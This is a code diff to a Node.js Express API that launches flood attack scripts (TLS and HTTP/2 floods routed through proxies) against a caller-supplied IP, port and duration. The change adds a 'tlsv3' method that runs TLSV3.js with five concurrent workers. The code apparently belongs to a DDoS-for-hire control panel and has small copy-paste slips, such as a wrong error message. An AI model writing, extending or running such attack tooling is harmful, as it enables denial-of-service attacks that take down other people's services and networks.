@@ -218,7 +218,17 @@ app.get('/api', verifyApiKey, async (req, res) => {
         console.log(`[TLS] Using proxies with prefixes (http://, socks://, etc)`);
 
         // Method TLSV2 (HTTP2 Flood via proxy) - KHUSUS PAKAI CLEAN PROXY (TANPA PREFIX)
-    } else if (normalizedMethod === 'tlsv2') {
+    } else if (normalizedMethod === 'tlsv3') {
+        scriptPath = path.join(SCRIPTS_DIR, 'TLSV3.js');
+        if (!fs.existsSync(scriptPath)) {
+            return res.status(404).json({ error: 'TLS.js not found' });
+        }
+        const concurrent = 5;
+        command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
+        console.log(`[TLS] Using proxies with prefixes (http://, socks://, etc)`);
+
+        // Method TLSV2 (HTTP2 Flood via proxy) - KHUSUS PAKAI CLEAN PROXY (TANPA PREFIX)
+    }else if (normalizedMethod === 'tlsv2') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLSV2.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLSV2.js not found' });
